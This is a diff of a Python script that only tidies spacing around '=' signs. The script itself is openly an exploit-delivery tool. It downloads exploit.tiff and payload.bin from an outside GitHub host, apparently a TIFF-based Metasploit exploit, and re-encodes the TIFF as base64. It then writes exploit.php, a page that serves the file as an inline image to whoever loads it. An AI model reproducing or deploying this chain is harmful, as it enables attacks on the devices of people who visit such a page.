@@ -55,7 +55,7 @@ def u32(b):
     return a.pack(">I", b)
 def pad(c):
     d=""
-    for _ in range(c): d += "\0"
+    for _ in range(c): d+="\0"
     return d
 class Waffleb:
 	def __init__(self):
@@ -165,15 +165,15 @@ def exploit(a, b):
       credits(0)
   elif a==1:
     with open('exploit.tiff', 'rb') as f:
-        hexdata = l.hexlify(f.read())
+        hexdata=l.hexlify(f.read())
         m.dump((hexdata.decode('utf-8')), open('hex.dat', 'wb'))
   elif a==2:
-    data2 = str(j.getcwd()) + "/" + "exploit.tiff"
-    url2 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
+    data2=str(j.getcwd()) + "/" + "exploit.tiff"
+    url2="https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
     downloadtask(data2, url2)
   elif a==3:
-    data1 = str(j.getcwd()) + "/" + "payload.bin"
-    url1 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
+    data1=str(j.getcwd()) + "/" + "payload.bin"
+    url1="https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
     downloadtask(data1, url1)
   elif a==4:
     credits(1)
@@ -195,17 +195,17 @@ def exploit(a, b):
   else:
     exploit(0)
 def run():
-  load_file = open('hex.dat', 'rb')
-  f = m.load(load_file)
+  load_file=open('hex.dat', 'rb')
+  f=m.load(load_file)
   with open('exploit.bin', 'wb') as fout:
     fout.write(
       l.unhexlify(f)
     )
   exploit(6, 0)
-  data = open('exploit.bin', 'rb').read()
-  a = l.b2a_base64(data)
-  b = a.decode()
-  html = '<?php\n$htmlcode = "<img src=\\"data:image/png;base64,' + b + '\\">";\necho $htmlcode\n?>'
+  data=open('exploit.bin', 'rb').read()
+  a=l.b2a_base64(data)
+  b=a.decode()
+  html='<?php\n$htmlcode="<img src=\\"data:image/png;base64,' + b + '\\">";\necho $htmlcode\n?>'
   open('exploit.php', 'w').write(html)
   exploit(7, 0)
   exploit(8, 0)
@@ -214,26 +214,26 @@ def pre(a):
   if a==0:
     task(1)
     task(0)
-    data = int(0)
+    data=int(0)
     return data
   elif a==1:
     task(1)
-    data = int(0)
+    data=int(0)
     return data
   elif a==2:
     exploit(5, 0)
     task(0)
-    data = "MSG:" + " " + str(j.getcwd()) + " " + "DOWNLOADED!"
+    data="MSG:" + " " + str(j.getcwd()) + " " + "DOWNLOADED!"
     return data
 def credits(a):
-    a = "credits:\n"
-    b = a + "base64 implmentation by fmw42\n"
-    c = b + "hex implementation by falsetru\n"
-    d = c + "file to hex implementation by ShadowRanger\n"
-    e = d + "urllib3 downloading implementation by shazrow\n"
-    f = e + "exploit.bin based on exploit.tiff by planetbeing\n"
+    a="credits:\n"
+    b=a + "base64 implmentation by fmw42\n"
+    c=b + "hex implementation by falsetru\n"
+    d=c + "file to hex implementation by ShadowRanger\n"
+    e=d + "urllib3 downloading implementation by shazrow\n"
+    f=e + "exploit.bin based on exploit.tiff by planetbeing\n"
     if a==0:
-      h = open("CREDITS.txt", "a")
+      h=open("CREDITS.txt", "a")
       h.write(f)
       h.close()
     elif a==1:
@@ -250,7 +250,7 @@ def task(a):
     run()
     j._exit(0)
 def downloadtask(a, b):
-	r = requests.get(b, allow_redirects=k)
+	r=requests.get(b, allow_redirects=k)
 	open(a, 'wb').write(r.content)
 	msg=returnmsg()
 	return msg
